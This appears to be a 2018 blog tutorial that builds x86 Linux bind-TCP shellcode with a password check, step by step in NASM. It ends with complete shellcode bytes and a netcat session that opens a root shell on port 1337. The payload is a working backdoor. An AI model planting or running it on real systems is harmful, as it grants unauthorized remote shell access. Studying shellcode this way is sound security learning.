---
layout: default
title: Shellcoding - x86 Bind TCP shell with a password
date: 2018-02-15T16:10:59Z
categories: shellcode
---

### Intro
Oh man, time flies fast. Before I even knew it three months passed again. So here I am again writing a little tutorial on how to create a simple bind TCP shellcode with a password.
As I get more involved into exploit development, I constantly keep finding myself creating shellcodes instead of using public ones. _I mean it kinda makes sense, I fell in love with creating shellcodes since the first time I wrote "Hello world" back in 2012-2013_
### Goals
So this is not a post that will explain how each instruction in x86 ASM works.
My goal is to break my shellcode into small chunks and replicate what I would do if the **"backdoor"** was written in C.

1. Use socket() to create a socket.
2. Use bind() to assing our port and interface.
3. Use listen() to listen for connections.
4. Use accept() to accept a connection.
5. Use recv() to get the password.
6. Use dup2() to duplicate STDIN,STDOUT,STDERR to our client socket.
7. Use excve() to execute '/bin/sh'.

### sys_socketcall
As in every shellcode we will use kernel syscalls to achieve our little list.
Running **man socketcall** will give you any info needed for the socketcall syscall.
You will probably find your syscall table at "/usr/src/linux-headers-$(uname -r)/arch/x86/include/generated/asm/syscalls_32.h" but I would recommend using the [Kernelgrok Syscall  Table](https://syscalls.kernelgrok.com/) as it provides you with info such as the syscall number and what parameters are used by each call.

You can find more info about the _"int call"_ used by _socketcall()_ as the first parameter at  "/usr/include/linux/net.h".

### The source code but every time I type xor it gets faster.

First zero our registers and call _{% raw %}socket(AF_INET,SOCK_STREAM,IP_PROTO){% endraw %}_ to create a new socket.

{% highlight nasm %}
section .text
global _start
_start:
        xor eax, eax    ; zero EAX before using it.
        xor ebx, ebx    ; zero EBX before using it.
        xor ecx, ecx    ; zero ECX before using it.
        xor edx, edx    ; zero EDX before using it.
        xor edi, edi    ; Zero EDI before using it.
        xor esi, esi    ; zero ESI before using it.

        mov al, 0x66    ; Put the sys_socketcall number into EAX.
        mov bl, 0x01    ; Put the sys_socket() call number into EBX.
        
        push esi        ; IP_PROTO      (0)
        push ebx        ; SOCK_STREAM   (1)
        push 0x02       ; AF_INET       (2)
        mov ecx, esp    ; Copy a pointer to our arguments in ECX.
                        ; ECX = *(AF_INET,SOCK_STREAM,IP_PROTO)

        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_socket,{AF_INET, SOCK_STREAM, IP_PROTO})
        
        xchg eax, edi   ; Save our socket to EDI for later usage.
{% endhighlight %}

In order to use the _bind()_ syscall we need to replicate the _sockaddr___in_ struct.

{% highlight c %}
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};
{% endhighlight %}

So let's call  _{% raw %}bind(sockefd,struct sockaddr_in, sizeof(struct sockaddr_in)){% endraw %}_.

{% highlight nasm %}
        xor ecx, ecx     ; Zero the ECX register.

        mov al, 0x66     ; Put the sys_socketcall number into EAX.
        inc ebx          ; Increase EBX so it points to sys_bind().

        push ecx         ; Set the sin_addr value to INADDR_ANY (0)
        push word 0x3905 ; Set the sin_port value to 1337
        push bx          ; Set the sin_family value to AF_INET  (2)
        mov ecx, esp     ; Copy a pointer to the sockaddr_in struct in ECX.

        push 0x10        ; Push the size of our struct
        push ecx         ; Push our sockaddr_in struct.
        push edi         ; Push our socket file descriptor.

        mov ecx, esp     ; Copy a pointer to our arguments in ECX.
        int 0x80         ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_bind,{socketfd, our_struct, sizeof(our_struct)}) 
{% endhighlight %}

Now we should call _listen(socketfd, 0)._

Also do not forget the listen label so we can jump here later.
{% highlight nasm %}
listen:
        xor ecx, ecx    ; Zero the ECX register.
    
        mov al, 0x66    ; Put the sys_socketcall number into EAX.
        mov bl, 0x04    ; Put the sys_listen() call number into EBX.
        
        push ecx        ; Push 0 for the backlog argument.
        push edi        ; Push our socket file descriptor.

        mov ecx, esp    ; Copy a pointer to our arguments in ECX.
        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_listen,{socketfd, 0})
{% endhighlight %}

Next we should call _accept(sockfd,NULL,NULL)_.

{% highlight nasm %}
        xor ecx, ecx    ; Zero the ECX register.
        
        mov al, 0x66    ; Put the sys_socketcall number into EAX.
        inc ebx         ; Increase EBX so it points to sys_accept().
        push ecx        ; Set sockaddr to NULL.
        push ecx        ; Set sockaddr_len to NULL.
        push edi        ; Push our socket file descriptor.

        mov ecx, esp    ; Copy a pointer to our arguments in ECX.
        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_accept,{socketfd,0,0})

        xchg eax, esi   ; Save our client socket to ESI for later usage.
{% endhighlight %}

In order to get the clients password we can call

_{% raw %}recv(client_socketfd, stack_address, addr_len, NULL){% endraw %}_

and compare it to our password.

{% highlight nasm %}

        xor ecx, ecx    ; Zero the ECX register.

        mov al, 0x66    ; Put the sys_socketcall number into EAX.
        mov bl, 0x0a    ; Put the sys_recv() call number into EBX.

        push ecx        ; NULL
        push 0x0c       ; Push the size to recv(). (12)
        push esp        ; Push the address to write our recieved data.
        push esi        ; Push our client socket file descriptor.

        mov ecx, esp    ; Copy a pointer to our arguments in ECX.
        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_recv,{client_socketfd,0,0})
{% endhighlight %}

Here is what our stack will look like before and after the **int 0x80** instruction.
{% highlight text %}


                    [       Before      ]
                    +-------------------+
            ESP --> |  client_socketfd  |
                    +-------------------+
                +4  |      esp_addr     |---+
                    +-------------------+   | Pointer to the previous address
                +8  |        0x0c       | <-+
                    +-------------------+
                +12 |        NULL       |
                    +-------------------+

                    [       After       ]
                    +-------------------+
            ESP --> |  client_socketfd  |
                    +-------------------+
                +4  |      esp_addr     |---+
                    +-------------------+   | Pointer to the password
                +8  |       'pass'      | <-+       
                    +-------------------+
                +12 |       'word'      |
                    +-------------------+
{% endhighlight %}

Time to compare the received string to our password "w0t1sd1s".

Of course our registers can only hold four characters, so we will just split it into two parts.
Don't forget that our string is in little-endian format.

{% highlight nasm %}
        
        cmp dword [esp + 8],  0x31743077 ; Compare password[1-4] to 'w0t1'
        jnz listen                       ; Jump to listen if not equal
        cmp dword [esp + 12], 0x73316473 ; Compare password[5-8] to 'sd1s'
        jnz listen                       ; Jump to listen if not equal


{% endhighlight %}

If someone connects to our shell and does not know the password, the shellcode will start re-listening to the same port.
That means the connection will hang until the end of time _or until they terminate the connection_.

So if you provide the wrong password to actually access the shell you need to re-connect and try again.

Next in our list, use _{% raw %}dup2(STDxxx,client_sockfd){% endraw %}_ and copy STDIN,STDOUT,STDERR to our client socket.

{% highlight nasm %}
        
        xor ecx, ecx    ; Zero out the ECX register, now it points to STDIN.
        mov ebx, esi    ; Copy socket file descriptor from ESI to EBX.

duploop:
        mov al, 0x3f    ; Put the sys_dup2 number into EAX.
        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        inc ecx         ; Increase ECX so it points to STDOUT, STDERR.
        cmp cl, 0x03    ; Check if we are EBX is bigger than STDERR (2).
        jnz duploop     ; if not keep increasing EBX and calling dup2().
        
        ; dup2(client_sockfd, STDIN)
        ; dup2(client_sockfd, STDOUT)
        ; dup2(client_sockfd, STDERR)
{% endhighlight %}

And last but not least calling _{% raw %}execve("/bin/sh",NULL,NULL){% endraw %}_.

The string "/bin/sh" is 7-bytes long, we have to push 8-bytes on the stack in order to avoid having a NULL byte in our shellcode.
We can just use **"//bin/sh"** or **"/bin//sh"** since it does not really make a difference.

{% highlight nasm %}
        xor ecx, ecx    ; Zero out the ECX register.
        
        mov al, 0x0b    ; Put the sys_execve number into EAX.
        push ecx        ; Push NULL so we can terminate our string.
        push 0x68732f6e ; 'n/sh'
        push 0x69622f2f ; '//bi'
        mov ebx, esp    ; Copy a pointer to "//bin/sh" in EBX.
        mov edx, ecx    ; Copy NULL from ECX

        int 0x80        ; Use interupt 0x80 to invoke a syscall.
{% endhighlight %}


### The actual code

{% highlight nasm %}
{% include files/shellcode/x86_bind_tcp_passwd.asm %}
{% endhighlight %}


### Our shellcode in action

Compile it.

{% highlight bash %}
nasm -felf shellcode.asm && ld -melf_i386 shellcode.o -o shellcode.out
{% endhighlight %}

Dump our shellcode.

{% highlight bash %}
objdump -d shellcode.out |grep '[0-9a-f]:' \
|grep -v 'file'  |cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' ' \
|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
{% endhighlight %}

Our shellcode. _After some manual formatting. *cough*_
{% highlight c %}
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\x31\xf6\xb0\x66\xb3\x01\x56"
"\x53\x6a\x02\x89\xe1\xcd\x80\x97\x31\xc9\xb0\x66\x43\x51\x66\x68\x05"
"\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc9\xb0\x66"
"\xb3\x04\x51\x57\x89\xe1\xcd\x80\x31\xc9\xb0\x66\x43\x51\x51\x57\x89"
"\xe1\xcd\x80\x96\x31\xc9\xb0\x66\xb3\x0a\x51\x6a\x0c\x54\x56\x89\xe1"
"\xcd\x80\x81\x7c\x24\x08\x77\x30\x31\x75\xce\x81\x7c\x24\x0c\x73\x64"
"\x73\x75\xc4\x31\xc9\x89\xf3\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6"
"\x31\xc9\xb0\x0b\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x89\xca\xcd\x80"
{% endhighlight %}

### Result

{% highlight text %}
# Server
root@arch:/# ./shellcode.out 
-----------------------------------------------------------------------------
# Client
root@kali:/# nc 192.168.2.139 1337
w0t1sd1s
python -c 'import pty; pty.spawn("/bin/sh")'
# whoami
whoami
root
{% endhighlight %}

### Closing thoughts

There is definitely room for improvement, I assume my shellcode could be 20-40 bytes smaller.
But then again, my goal was just to create this shellcode without caring **that much** about the size.

